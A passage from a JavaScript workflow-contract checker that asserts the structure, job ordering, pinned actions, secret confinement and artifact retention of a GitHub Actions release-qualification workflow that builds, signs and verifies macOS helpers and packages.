  check(doc?.on && typeof doc.on === "object" && same(Object.keys(doc.on), ["workflow_dispatch"]), "must be triggered by workflow_dispatch only");
  check(same(doc?.permissions, { contents: "read" }), "top-level permissions must be exactly contents: read");
  check(doc?.concurrency?.group === PUBLISH_CONCURRENCY_GROUP, "qualification must use a unique workflow-run concurrency group");
  check(doc?.concurrency?.["cancel-in-progress"] === "false", "a publish must never be cancelled half-way");
  check(same(sorted(Object.keys(jobs)), sorted(ALL_JOBS)), `jobs must be exactly ${ALL_JOBS.join(", ")}`);
  const { guard, plan, pack, verify } = jobs;
  const verifyLinux = jobs["verify-linux"];
  const signSwap = jobs["sign-swap"];
  const rest = { ...doc }; delete rest.jobs;
  check(findMatches(rest, SECRET_PATTERN).length === 0 && findMatches(rest, ID_TOKEN_PATTERN).length === 0, `no secret or id-token outside a job (${[...findMatches(rest, SECRET_PATTERN), ...findMatches(rest, ID_TOKEN_PATTERN)].map((h) => h.path).join(", ")})`);
  check(doc?.env === undefined && doc?.defaults === undefined, "no workflow-level env or defaults");
  check(findKey(doc, "continue-on-error").length === 0, `continue-on-error is forbidden (${findKey(doc, "continue-on-error").join(", ")})`);
  check(findKey(doc, "pull_request_target").length === 0, "pull_request_target is forbidden");

  check(doc?.on?.workflow_dispatch?.inputs?.dry_run === undefined, "qualification has no dry_run dispatch input");
  check(plan?.outputs?.dry_run === undefined, "qualification has no dry_run output");
  check(stepsOf(plan).find((s) => s.run?.trim() === "node scripts/ci/publish.mjs plan")?.env?.PUBLISH_DRY_RUN === "false", "qualification planning must require production-grade pins");
  check(findMatches(jobs, /upload\.mjs|reviewed-candidate\.mjs run/).length === 0, "qualification cannot execute publication code or require approval before packing");
  check(stepsOf(pack).filter((s) => s.run?.trim() === "node scripts/ci/publish.mjs pack").length === 1, "qualification must pack exactly once");
  const receipt = stepsOf(verify).filter((s) => s.with?.name === "publish-receipt-verify-${{ matrix.os }}");
  check(receipt.length === 1 && receipt[0].with.path === `${RT}/verify-receipt` && receipt[0].with["if-no-files-found"] === "error" && receipt[0].with["retention-days"] === "90", "every verify host must retain its native receipt");
  const linuxReceipt = stepsOf(verifyLinux).filter((s) => s.with?.name === `publish-receipt-verify-${LINUX_HOST_LABEL}`);
  check(linuxReceipt.length === 1 && /^actions\/upload-artifact@/.test(linuxReceipt[0].uses ?? "") && linuxReceipt[0].with.path === `${RT}/verify-receipt` && linuxReceipt[0].with["if-no-files-found"] === "error" && linuxReceipt[0].with["retention-days"] === "90" && linuxReceipt[0].if === undefined, "the Linux verify job must retain its native receipt unconditionally");
  check(plan?.outputs?.linux_count === "${{ steps.plan.outputs.linux_count }}" && plan?.outputs?.linux_units === "${{ steps.plan.outputs.linux_units }}", "plan must expose the Linux-required unit count and names");

  const qualified = jobs.qualified;
  check(same(needsOf(qualified), ["guard", "plan", "pack", "verify", "verify-linux"]) && qualified?.if === "${{ always() }}", "qualified must always inspect guard, plan, pack, both-host verify & Linux verify results");
  check(same(sorted(Object.keys(qualified ?? {})), ["if", "needs", "runs-on", "steps", "timeout-minutes"]) && qualified?.["runs-on"] === "ubuntu-24.04", "qualified must be a closed hosted result gate");
  check(stepsOf(qualified).length === 1 && same(sorted(Object.keys(qualified.steps[0])), ["env", "name", "run"]) && same(qualified.steps[0].env, QUALIFIED_ENV) && qualified.steps[0].run === QUALIFIED_RUN, "qualified must fail for every failed, cancelled or skipped prerequisite & empty plan");

  for (const [jobName, artifactName] of [["pack", "publish-packed"], ["build-swap", UNSIGNED_ARTIFACT], ["sign-swap", SIGN_SWAP_ARTIFACT], ["build-credentials-helper", UNSIGNED_CREDENTIALS_ARTIFACT], ["sign-credentials-helper", SIGN_CREDENTIALS_ARTIFACT], ["verify", "publish-verify-${{ matrix.os }}-${{ github.run_attempt }}"], ["verify-linux", `publish-verify-${LINUX_HOST_LABEL}-\${{ github.run_attempt }}`]]) {
    const artifacts = stepsOf(jobs[jobName]).filter((s) => /^actions\/upload-artifact@/.test(s.uses ?? "") && s.with?.name === artifactName);
    check(artifacts.length === 1 && artifacts[0].with["retention-days"] === "90", `${artifactName} must retain qualification evidence for 90 days`);
  }

  // The main-only, public-only guard, and every job behind it.
  const guardStep = stepsOf(guard)[0];
  check(guard && stepsOf(guard).length === 1 && guard.if === undefined && guardStep?.if === undefined, "guard must be one unconditional step");
  check(guardStep?.env?.REF === "${{ github.ref }}" && guardStep?.env?.PRIVATE === "${{ github.event.repository.private }}", "guard must read the ref and repository visibility from the event");
  check(/if \[ "\$REF" != "refs\/heads\/main" \]; then\s+echo [^\n]*\s+exit 1\s+fi/.test(guardStep?.run ?? ""), "guard must exit 1 unless the ref is refs/heads/main");
  check(/if \[ "\$PRIVATE" != "false" \]; then\s+echo [^\n]*\s+exit 1\s+fi/.test(guardStep?.run ?? ""), "guard must exit 1 unless the repository is public");
  const reaches = (job, target, seen = new Set()) => needsOf(jobs[job]).some((n) => n === target || (!seen.has(n) && seen.add(n) && reaches(n, target, seen)));
  for (const job of ALL_JOBS.filter((j) => j !== "guard")) check(reaches(job, "guard"), `${job} must run only after guard`);
  for (const [jobName, job] of Object.entries(jobs)) {
    check((job["timeout-minutes"] ?? "") !== "", `${jobName} must set timeout-minutes`);
  }

  // Both native verify hosts qualify sealed archives.
  check(same(sorted(verify?.strategy?.matrix?.os ?? []), VERIFY_HOSTS), `verify must run on exactly ${VERIFY_HOSTS.join(" and ")}`);
  check(verify?.strategy?.matrix && !("exclude" in verify.strategy.matrix) && !("include" in verify.strategy.matrix), "verify matrix must not exclude or include legs");
  check(verify?.["runs-on"] === "${{ matrix.os }}", "verify must run on the matrix host");
  for (const needed of ["guard", "plan", "build-swap", "sign-swap"]) check(needsOf(pack).includes(needed), `pack must need ${needed}`);
  for (const needed of ["guard", "plan", "pack", "build-credentials-helper", "sign-credentials-helper"]) check(needsOf(verify).includes(needed), `verify must need ${needed}`);
  check(typeof verify?.if === "string" && verify.if.trim() === VERIFY_IF, `verify's condition must be exactly ${VERIFY_IF}`);
  // pack runs after sign-swap succeeded or was skipped (a crates run, or a run without @rightkit/release), never after it failed.
  check(typeof pack?.if === "string" && pack.if.trim() === PACK_IF, `pack's condition must be exactly ${PACK_IF}`);
  const verifyRuns = stepsOf(verify).map((s) => s.run ?? "");
  const gateAt = verifyRuns.findIndex((r) => /node scripts\/ci\/gate\.mjs --registry /.test(r) && /--allow-host-exclusion/.test(r) && /--allow-no-test/.test(r));
  const receiptAt = verifyRuns.findIndex((r) => /node scripts\/ci\/publish\.mjs verify/.test(r));
  check(gateAt >= 0 && receiptAt > gateAt, "verify must run the unit gate, then publish.mjs verify, on every host");
  check(stepsOf(verify)[receiptAt]?.env?.RIGHTKIT_CHROME_FOR_TESTING_ROOT === `${RT}/chrome-for-testing`, "verify receipt must use the provisioned managed Chrome root");
  const winAt = WIN_OPENSSL_STEPS.map(([name]) => stepsOf(verify).findIndex((s) => s.name === name));
  WIN_OPENSSL_STEPS.forEach(([name, run], i) => {
    const step = stepsOf(verify)[winAt[i]];
    check(stepsOf(verify).filter((s) => s.name === name).length === 1 && same(sorted(Object.keys(step ?? {})), ["if", "name", "run", "shell"]) && step?.if?.trim() === WIN_OPENSSL_IF && step?.shell === "pwsh" && step?.run?.trim() === run, `verify must run exactly "${run}" (pwsh, no env or inputs) as "${name}" under ${WIN_OPENSSL_IF}`);
  });
  check(winAt[0] >= 0 && winAt[1] > winAt[0] && winAt[1] < gateAt, "verify must select native Perl, then locate native OpenSSL, before the unit gate");
  check(stepsOf(verify).filter((s) => s.shell === "pwsh" || /\.ps1\b/.test(s.run ?? "")).length === WIN_OPENSSL_STEPS.length, "verify may run PowerShell only for the two native Windows OpenSSL steps");
  const fsIf = "${{ needs.plan.outputs.registry == 'crates' && contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-fs ') }}";
  const fsCleanupIf = "${{ always() && needs.plan.outputs.registry == 'crates' && contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-fs ') }}";
  const fsSetupAt = verifyRuns.findIndex(r => r.includes("node scripts/ci/fs-native-fixtures.mjs setup"));
  const fsCleanupAt = verifyRuns.findIndex(r => r.trim() === "node scripts/ci/fs-native-fixtures.mjs cleanup");
  const fsSetup = stepsOf(verify)[fsSetupAt]; const fsCleanup = stepsOf(verify)[fsCleanupAt];
  check(fsSetupAt >= 0 && fsSetupAt < gateAt && fsCleanupAt > receiptAt && fsSetup?.if === fsIf && fsCleanup?.if === fsCleanupIf, "FS verification must mount native fixtures before gate & always clean up after archive consumer verification");
  check(fsSetup?.run?.includes('path.join(process.env.RUNNER_TEMP, "rk-fs-native-state.json")') && fsSetup?.run?.includes('fs.appendFileSync(process.env.GITHUB_ENV, `RIGHTKIT_FS_TEST_OTHER_VOLUME=${plan.other}\\n`)') && fsSetup?.env?.FS_NATIVE_OUT === `${RT}/rightkit-ci/fs-native` && fsCleanup?.env?.FS_NATIVE_OUT === `${RT}/rightkit-ci/fs-native`, "FS gate must use mounted plan.other volume & retain fixture cleanup evidence");
  check(!verifyRuns.some(r => /node scripts\/ci\/registry-consumer\.mjs/.test(r)), "publish.mjs verify owns selected PK consumers without duplicate standalone Cargo consumers");
  const chromeStep = stepsOf(verify).find((s) => /provision-chrome\.mjs/.test(s.run ?? ""));
  check(chromeStep?.run?.trim() === "node scripts/ci/provision-chrome.mjs" && chromeStep?.env?.PUBLISH_DRY_RUN === "false", "the Chrome pin step must require pinned downloads with PUBLISH_DRY_RUN false");
  const chromeCache = stepsOf(verify).find((s) => s.name === "Cache the pinned Chrome for Testing");
  check(chromeCache?.if?.trim() === CHROME_IF && chromeCache?.uses?.startsWith("actions/cache@"), "the pinned Chrome cache must cover npm @rightkit/qa, @rightkit/react-shell, @rightkit/settings-ui and @rightkit/onboarding plus crates rightkit-browser");
  check(chromeStep?.if?.trim() === CHROME_IF, "the pinned Chrome provision step must cover npm @rightkit/qa, @rightkit/react-shell, @rightkit/settings-ui and @rightkit/onboarding plus crates rightkit-browser");
  // The macOS-only credentials helper route: download the same-run signed artifact, then export its route
  // through provision-credentials-helper-env.mjs before the gate; gate and receipt read the three helper
  // vars from the job environment, never from the candidate or a literal.
  const credsDownload = stepsOf(verify).filter((s) => /^actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === SIGN_CREDENTIALS_ARTIFACT);
  check(credsDownload.length === 1 && same(sorted(Object.keys(credsDownload[0].with)), ["name", "path"]) && credsDownload[0].with.path === `${RT}/credentials-helper-signed` && credsDownload[0].if?.trim() === CREDENTIALS_VERIFY_STEP_IF, `verify must download ${SIGN_CREDENTIALS_ARTIFACT} into ${RT}/credentials-helper-signed only on the macOS leg after a successful credentials signing`);
  const credsSteps = stepsOf(verify).filter((s) => /provision-credentials-helper-env\.mjs/.test(s.run ?? ""));
  check(credsSteps.length === 1 && credsSteps[0]?.run?.trim() === "node scripts/ci/provision-credentials-helper-env.mjs" && same(credsSteps[0]?.env, { CREDENTIALS_HELPER_SIGNED_ROOT: `${RT}/credentials-helper-signed` }) && credsSteps[0]?.shell === "bash" && credsSteps[0]?.if?.trim() === CREDENTIALS_VERIFY_STEP_IF, "verify must export the sealed signed-helper route from the same-run artifact on the macOS leg");
  const credsDownloadAt = stepsOf(verify).findIndex((s) => /^actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === SIGN_CREDENTIALS_ARTIFACT);
  const credsProvisionAt = stepsOf(verify).findIndex((s) => /provision-credentials-helper-env\.mjs/.test(s.run ?? ""));
  check(credsDownloadAt >= 0 && credsProvisionAt > credsDownloadAt && credsProvisionAt < gateAt, "verify must download the signed helper, then export its route, before the unit gate");
  const keychainSteps = stepsOf(verify).filter((s) => s.name === "Provision the job-local default keychain for credentials consumers");
  const keychainRun = "set -euo pipefail\nkeychain=\"$RUNNER_TEMP/consumer-default.keychain-db\"\npassword=\"$(uuidgen)\"\nrm -f \"$keychain\"\nsecurity create-keychain -p \"$password\" \"$keychain\"\nsecurity set-keychain-settings -lut 21600 \"$keychain\"\nsecurity unlock-keychain -p \"$password\" \"$keychain\"\nsecurity default-keychain -s \"$keychain\"\n";
  check(keychainSteps.length === 1 && keychainSteps[0]?.run === keychainRun && keychainSteps[0]?.shell === "bash" && keychainSteps[0]?.if?.trim() === CREDENTIALS_VERIFY_STEP_IF && stepsOf(verify).indexOf(keychainSteps[0]) < gateAt, "verify must provision a job-local default keychain on the macOS credentials leg before the gate");
  check(stepsOf(verify)[gateAt]?.env?.RK_SOURCE_HELPER_APP === CREDENTIALS_HELPER_ENV.RK_SOURCE_HELPER_APP && stepsOf(verify)[gateAt]?.env?.RK_CONSUMER_HELPER_NAME === CREDENTIALS_HELPER_ENV.RK_CONSUMER_HELPER_NAME && stepsOf(verify)[gateAt]?.env?.RK_CONSUMER_HELPER_TEAM_ID === CREDENTIALS_HELPER_ENV.RK_CONSUMER_HELPER_TEAM_ID, "verify gate must read the signed helper route from the job environment");
  check(stepsOf(verify)[receiptAt]?.env?.RK_SOURCE_HELPER_APP === CREDENTIALS_HELPER_ENV.RK_SOURCE_HELPER_APP && stepsOf(verify)[receiptAt]?.env?.RK_CONSUMER_HELPER_NAME === CREDENTIALS_HELPER_ENV.RK_CONSUMER_HELPER_NAME && stepsOf(verify)[receiptAt]?.env?.RK_CONSUMER_HELPER_TEAM_ID === CREDENTIALS_HELPER_ENV.RK_CONSUMER_HELPER_TEAM_ID, "verify receipt must read the signed helper route from the job environment");
  check(stepsOf(verify).some((s) => /actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === "publish-packed"), "verify must download the sealed publish-packed artifact");
  check(stepsOf(pack).some((s) => /node scripts\/ci\/publish\.mjs pack/.test(s.run ?? "")) && stepsOf(pack).some((s) => /actions\/upload-artifact@/.test(s.uses ?? "") && s.with?.name === "publish-packed"), "pack must seal and upload publish-packed");
  check(stepsOf(plan).some((s) => /node scripts\/ci\/workflow-contract\.mjs/.test(s.run ?? "")), "plan must run this contract before planning");

  // Linux verification: only the units the plan requires on Linux, only when there are any, through the same gate and receipt.
  check(verifyLinux && !("strategy" in verifyLinux) && verifyLinux?.["runs-on"] === LINUX_HOST_LABEL, `verify-linux must run on ${LINUX_HOST_LABEL} with no matrix`);
  check(same(sorted(Object.keys(verifyLinux ?? {})), ["if", "needs", "permissions", "runs-on", "steps", "timeout-minutes"]), "verify-linux job is closed against containers, env & defaults");
  check(same(needsOf(verifyLinux), ["guard", "plan", "pack"]), "verify-linux must need exactly guard, plan & pack");
  check(typeof verifyLinux?.if === "string" && verifyLinux.if.trim() === LINUX_IF, `verify-linux's condition must be exactly ${LINUX_IF}`);
  const linuxSteps = stepsOf(verifyLinux);
  const linuxGateAt = linuxSteps.findIndex((s) => /node scripts\/ci\/gate\.mjs /.test(s.run ?? ""));
  const linuxVerifyAt = linuxSteps.findIndex((s) => /node scripts\/ci\/publish\.mjs verify/.test(s.run ?? ""));
  check(linuxSteps.filter((s) => /node scripts\/ci\/gate\.mjs /.test(s.run ?? "")).length === 1 && linuxSteps[linuxGateAt]?.run?.trim() === 'node scripts/ci/gate.mjs --registry "$PUBLISH_REGISTRY" --units "$PUBLISH_LINUX_UNITS"', "verify-linux must gate exactly the Linux-required units, with no allowance flag");
  check(linuxGateAt >= 0 && linuxSteps[linuxGateAt].env?.PUBLISH_LINUX_UNITS === PLAN_OUT("linux_units") && linuxSteps[linuxGateAt].env?.PUBLISH_REGISTRY === PLAN_OUT("registry") && linuxSteps[linuxGateAt].if === undefined, "the Linux gate must read the plan's registry and linux_units unconditionally");
  check(linuxSteps.filter((s) => /node scripts\/ci\/publish\.mjs verify/.test(s.run ?? "")).length === 1 && linuxVerifyAt > linuxGateAt && linuxGateAt >= 0 && linuxSteps[linuxVerifyAt].run?.trim() === "node scripts/ci/publish.mjs verify" && linuxSteps[linuxVerifyAt].if === undefined && same(linuxSteps[linuxVerifyAt].env, { RIGHTKIT_CHROME_FOR_TESTING_ROOT: `${RT}/chrome-for-testing`, ...PUBLISH_ENV, PUBLISH_LINUX_UNITS: PLAN_OUT("linux_units") }), "verify-linux must gate, then write the Linux receipt with the plan's exact request");
  const linuxChromeCache = linuxSteps.find((s) => s.name === "Cache the pinned Chrome for Testing");
  const linuxChrome = linuxSteps.find((s) => /provision-chrome\.mjs/.test(s.run ?? ""));
  check(linuxChromeCache?.if?.trim() === LINUX_CHROME_IF && linuxChromeCache?.uses?.startsWith("actions/cache@") && linuxChrome?.if?.trim() === LINUX_CHROME_IF && linuxChrome?.run?.trim() === "node scripts/ci/provision-chrome.mjs" && linuxChrome?.env?.PUBLISH_DRY_RUN === "false", "verify-linux must provision the pinned Chrome for Testing for the Linux units (pinned download, never a dry run)");
  check(linuxSteps.some((s) => /actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === "publish-packed"), "verify-linux must download the sealed publish-packed artifact");
  check(linuxSteps.some((s) => /^actions\/checkout@/.test(s.uses ?? "")), "verify-linux must check out the dispatched commit");

  // Qualification has no registry privilege; only the two signers hold Apple secrets (sign-swap the
  // identity alone, sign-credentials-helper the identity plus the qualification provisioning profile).
  const privileged = ["sign-swap", "sign-credentials-helper"];
  for (const [jobName, job] of Object.entries(jobs)) {
    const isSign = privileged.includes(jobName);
    const secretHits = findMatches(job, SECRET_PATTERN); const idHits = findMatches(job, ID_TOKEN_PATTERN);
    if (!isSign) check(secretHits.length === 0, `${jobName} must not reference the secrets context in any form (${secretHits.map((h) => h.path).join(", ")})`);
    check(idHits.length === 0, `${jobName} must not request id-token (${idHits.map((h) => h.path).join(", ")})`);
    if (!isSign) check(job.environment === undefined, `${jobName} must not use an environment`);
    check(job.env === undefined && job.uses === undefined && job.secrets === undefined, `${jobName} has no job-level env, uses or secrets`);
    check(job.permissions === undefined || same(job.permissions, { contents: "read" }), `${jobName} permissions must be contents: read`);
  }
  // Licence gate: pinned install, then the exact check, both only for a crates run naming rightkit-typeset, both after the plan step,
  // in a job with no secret; pack & verify both require plan.
  const planSteps = stepsOf(plan);
  for (const step of planSteps) if (step.uses) check(PLAN_ALLOWED_ACTIONS.some((a) => step.uses.startsWith(a)), `plan may use only ${PLAN_ALLOWED_ACTIONS.join(", ")}, not ${step.uses}`);
  const denyInstallAt = planSteps.findIndex((s) => (s.uses ?? "").startsWith("taiki-e/install-action@"));
  const denyRunAt = planSteps.findIndex((s) => /cargo deny\b/.test(s.run ?? ""));
  const planAt = planSteps.findIndex((s) => s.run?.trim() === "node scripts/ci/publish.mjs plan");
  check(denyInstallAt >= 0 && planSteps.filter((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).length === 1 && planSteps[denyInstallAt].if?.trim() === DENY_IF && same(Object.keys(planSteps[denyInstallAt].with ?? {}), ["tool"]) && planSteps[denyInstallAt].with.tool === DENY_TOOL && planSteps[denyInstallAt].env === undefined, `plan must install ${DENY_TOOL} (pinned action, only the tool input) under the exact licence-gate condition`);
  check(denyRunAt >= 0 && planSteps.filter((s) => /cargo deny\b/.test(s.run ?? "")).length === 1 && planSteps[denyRunAt].run.trim() === DENY_RUN && planSteps[denyRunAt].if?.trim() === DENY_IF && planSteps[denyRunAt].env === undefined && planSteps[denyRunAt].shell === undefined, `plan must run exactly "${DENY_RUN}" under the exact licence-gate condition, with no env or shell`);
  check(planAt >= 0 && denyInstallAt > planAt && denyRunAt > denyInstallAt, "the licence gate must install the checker, then run it, after the plan step");
  for (const job of ["pack", "verify", "verify-linux"]) check(reaches(job, "plan"), `${job} must run only after plan, which holds the licence gate`);

  // Isolated native builder emits only sealed bytes; fresh signer has no source checkout or build process.
  const buildSwap = jobs["build-swap"]; const buildSteps = stepsOf(buildSwap);
  check(buildSwap?.if === BUILD_SWAP_IF && same(needsOf(buildSwap), ["guard", "plan"]) && buildSwap?.["runs-on"] === "xcode-27", "build-swap must be the native secretless build behind guard & plan");
  check(same(sorted(Object.keys(buildSwap ?? {})), ["if", "needs", "outputs", "permissions", "runs-on", "steps", "timeout-minutes"]) && same(buildSwap?.outputs, { sha256: "${{ steps.seal.outputs.sha256 }}" }), "build-swap must expose only its sealed helper hash");
  check(buildSteps.length === 5 && buildSteps[2]?.run === "cargo build --release --locked -p rightkit-fs --bin rightkit-swap --features fs" && buildSteps[2]?.env === undefined && buildSteps[3]?.run === UNSIGNED_SEAL_RUN && buildSteps[3]?.id === "seal" && buildSteps[3]?.shell === "bash" && buildSteps[3]?.env === undefined && buildSteps[3]?.if === undefined, "build-swap must build & seal with exact source/run/hash receipt before artifact transfer");
  check(buildSteps[0]?.uses === "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1" && buildSteps[1]?.uses === "dtolnay/rust-toolchain@f8be11a05b1d4f3fcebe6410cc16743212b999b0", "build-swap uses pinned checkout & native toolchain");
  check(buildSteps[4]?.uses === "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02" && same(buildSteps[4]?.with, { name: UNSIGNED_ARTIFACT, path: `${RT}/swap-unsigned`, "retention-days": "90", overwrite: "false", "if-no-files-found": "error" }) && buildSteps[4]?.if === undefined, "build-swap must retain immutable unsigned helper artifact");
  const buildCreds = jobs["build-credentials-helper"]; const buildCredsSteps = stepsOf(buildCreds);
  check(buildCreds?.if === BUILD_CREDENTIALS_IF && same(needsOf(buildCreds), ["guard", "plan"]) && buildCreds?.["runs-on"] === "xcode-27", "build-credentials-helper must be the native secretless build behind guard & plan");
  check(same(sorted(Object.keys(buildCreds ?? {})), ["if", "needs", "outputs", "permissions", "runs-on", "steps", "timeout-minutes"]) && same(buildCreds?.outputs, { sha256: "${{ steps.seal.outputs.sha256 }}" }), "build-credentials-helper must expose only its sealed helper hash");
  check(buildCredsSteps.length === 4 && buildCredsSteps[1]?.name === "Build the unsigned qualification helper from pinned sources" && buildCredsSteps[1]?.run === CREDENTIALS_BUILD_RUN && buildCredsSteps[1]?.env === undefined && buildCredsSteps[1]?.shell === "bash" && buildCredsSteps[1]?.if === undefined && buildCredsSteps[2]?.id === "seal" && buildCredsSteps[2]?.run === CREDENTIALS_SEAL_RUN && buildCredsSteps[2]?.shell === "bash" && buildCredsSteps[2]?.env === undefined && buildCredsSteps[2]?.if === undefined, "build-credentials-helper must build from pinned sources & seal with exact source/hash receipt before artifact transfer");
  check(buildCredsSteps[0]?.uses === "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1" && same(buildCredsSteps[0]?.with, { "persist-credentials": "false", "fetch-depth": "0" }), "build-credentials-helper checks out the dispatched commit with full history for pinned-blob access and no credentials");
  check(buildCredsSteps[3]?.uses === "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02" && same(buildCredsSteps[3]?.with, { name: UNSIGNED_CREDENTIALS_ARTIFACT, path: `${RT}/credentials-helper-unsigned`, "retention-days": "90", overwrite: "false", "if-no-files-found": "error" }) && buildCredsSteps[3]?.if === undefined, "build-credentials-helper must retain immutable unsigned helper artifact");
  const signSteps = stepsOf(signSwap);
  check(same(findMatches(signSwap, SECRET_PATTERN), Object.entries(SIGN_SWAP_SECRETS).map(([key, text]) => ({ path: `.steps[2].env.${key}`, text }))), "sign-swap secrets context must occur only in exact identity import step after validation");
  check(same(sorted(Object.keys(signSwap ?? {})), ["environment", "if", "needs", "permissions", "runs-on", "steps", "timeout-minutes"]), "sign-swap job is closed against containers, env & defaults");
  check(signSwap?.environment === "release" && same(signSwap?.permissions, { contents: "read" }) && signSwap?.["runs-on"] === "xcode-27", "sign-swap uses only native signing environment with no OIDC");
  check(signSwap?.if === SIGN_SWAP_IF && same(needsOf(signSwap), ["guard", "plan", "build-swap"]), "sign-swap requires successful build-swap, guard & plan");
  check(signSteps.length === 6, "fresh signer must have exactly download, validation, identity, signing, cleanup & handover steps");
  check(same(sorted(Object.keys(signSteps[0] ?? {})), ["name", "uses", "with"]) && signSteps[0]?.uses === "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093" && same(signSteps[0]?.with, { name: UNSIGNED_ARTIFACT, path: `${RT}/swap-unsigned` }), "signer downloads only exact unsigned artifact from same run, with no checkout or foreign run");
  const expectedRuns = [UNSIGNED_VALIDATE_RUN, SIGN_IDENTITY_RUN, SIGN_HELPER_RUN, SIGN_CLEANUP_RUN];
  const expectedEnvs = [{ EXPECTED_SHA256: "${{ needs.build-swap.outputs.sha256 }}" }, SIGN_SWAP_SECRETS, { APPLE_DEVELOPER_ID: "${{ vars.APPLE_DEVELOPER_ID }}" }, undefined];
  for (let i = 1; i <= 4; i++) {
    const step = signSteps[i];
    const expectedKeys = i === 4 ? ["if", "name", "run", "shell"] : ["env", "name", "run", "shell"];
    check(same(sorted(Object.keys(step ?? {})), expectedKeys) && step?.run === expectedRuns[i - 1] && same(step?.env, expectedEnvs[i - 1]) && step?.shell === "bash" && step?.if === (i === 4 ? "${{ always() }}" : undefined), `signer step ${i} must match exact validation/signing-only source & authority`);
  }
  check(same(sorted(Object.keys(signSteps[5] ?? {})), ["name", "uses", "with"]) && signSteps[5]?.uses === "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02" && same(signSteps[5]?.with, { name: SIGN_SWAP_ARTIFACT, path: `${RT}/swap-signed`, "retention-days": "90", overwrite: "true", "if-no-files-found": "error" }), "signer hands over only signed helper & bound source/hash receipts");
  // Fresh signer for the credentials helper: same closure and step discipline as sign-swap, plus the
  // release-environment provisioning profile decoded, validated and embedded before Developer ID signing.
  const signCreds = jobs["sign-credentials-helper"]; const signCredsSteps = stepsOf(signCreds);
  check(same(sorted(Object.keys(signCreds ?? {})), ["environment", "if", "needs", "permissions", "runs-on", "steps", "timeout-minutes"]) && signCreds?.environment === "release" && same(signCreds?.permissions, { contents: "read" }) && signCreds?.["runs-on"] === "xcode-27", "sign-credentials-helper uses only native signing environment with no OIDC");
  check(signCreds?.if === SIGN_CREDENTIALS_IF && same(needsOf(signCreds), ["guard", "plan", "build-credentials-helper"]), "sign-credentials-helper requires successful credentials build, guard & plan");
  check(signCredsSteps.length === 6, "credentials signer must have exactly download, validation, identity, signing, cleanup & handover steps");
  check(same(sorted(Object.keys(signCredsSteps[0] ?? {})), ["name", "uses", "with"]) && signCredsSteps[0]?.uses === "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093" && same(signCredsSteps[0]?.with, { name: UNSIGNED_CREDENTIALS_ARTIFACT, path: `${RT}/credentials-helper-unsigned` }), "credentials signer downloads only exact unsigned artifact from same run, with no checkout or foreign run");
  const credsExpectedRuns = [CREDENTIALS_VALIDATE_RUN, SIGN_IDENTITY_RUN, CREDENTIALS_SIGN_RUN, CREDENTIALS_CLEANUP_RUN];
  const credsExpectedEnvs = [{ EXPECTED_SHA256: "${{ needs.build-credentials-helper.outputs.sha256 }}" }, SIGN_SWAP_SECRETS, { APPLE_DEVELOPER_ID: "${{ vars.APPLE_DEVELOPER_ID }}", APPLE_CREDENTIALS_QUAL_PROFILE_BASE64: "${{ secrets.APPLE_CREDENTIALS_QUAL_PROFILE_BASE64 }}" }, undefined];
  for (let i = 1; i <= 4; i++) {
    const step = signCredsSteps[i];
    const expectedKeys = i === 4 ? ["if", "name", "run", "shell"] : ["env", "name", "run", "shell"];
    check(same(sorted(Object.keys(step ?? {})), expectedKeys) && step?.run === credsExpectedRuns[i - 1] && same(step?.env, credsExpectedEnvs[i - 1]) && step?.shell === "bash" && step?.if === (i === 4 ? "${{ always() }}" : undefined), `credentials signer step ${i} must match exact validation/signing-only source & authority`);
  }
  check(same(sorted(Object.keys(signCredsSteps[5] ?? {})), ["name", "uses", "with"]) && signCredsSteps[5]?.uses === "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02" && same(signCredsSteps[5]?.with, { name: SIGN_CREDENTIALS_ARTIFACT, path: `${RT}/credentials-helper-signed`, "retention-days": "90", overwrite: "true", "if-no-files-found": "error" }), "credentials signer hands over only signed helper & bound source/hash receipts");
  check(same(findMatches(signCreds, SECRET_PATTERN), [...Object.entries(SIGN_SWAP_SECRETS).map(([key, text]) => ({ path: `.steps[2].env.${key}`, text })), { path: ".steps[3].env.APPLE_CREDENTIALS_QUAL_PROFILE_BASE64", text: "${{ secrets.APPLE_CREDENTIALS_QUAL_PROFILE_BASE64 }}" }]), "sign-credentials-helper secrets context must occur only in exact identity import and profile signing steps");
  // pack is secretless and consumes the signed helper only by download.
  const packSwapDownload = stepsOf(pack).filter((s) => /^actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === SIGN_SWAP_ARTIFACT);
  check(packSwapDownload.length === 1 && packSwapDownload[0].if?.trim() === PACK_SWAP_STEP_IF && same(sorted(Object.keys(packSwapDownload[0].with)), ["name", "path"]) && packSwapDownload[0].with.path === `${RT}/swap-signed`, `pack must download ${SIGN_SWAP_ARTIFACT} into ${RT}/swap-signed with only name and path, only when sign-swap succeeded`);
  const packSigningRuns = stepsOf(pack).filter((s) => SIGNING_TOOLS.test(s.run ?? ""));
  check(packSigningRuns.length === 0, `pack must not sign or build the helper itself (${packSigningRuns.map((s) => s.name ?? s.run).join(", ")})`);
  const placeAt = stepsOf(pack).findIndex((s) => /install -m 0755 [^\n]*packages\/release\/bin\/darwin\/rightkit-swap/.test(s.run ?? "") && /sha256sum -c/.test(s.run ?? ""));
  const packAt = stepsOf(pack).findIndex((s) => /node scripts\/ci\/publish\.mjs pack/.test(s.run ?? ""));
  check(placeAt >= 0 && stepsOf(pack)[placeAt].if?.trim() === PACK_SWAP_STEP_IF && placeAt < packAt, "pack must re-check the helper's sha256, place it at packages/release/bin/darwin/rightkit-swap and do so before it packs");

  // pack builds only the planned npm units and their workspace dependency closure, never the whole workspace.
  const packSteps = stepsOf(pack);
  const packBuildAt = packSteps.findIndex((s) => s.run?.trim() === PACK_BUILD_RUN);
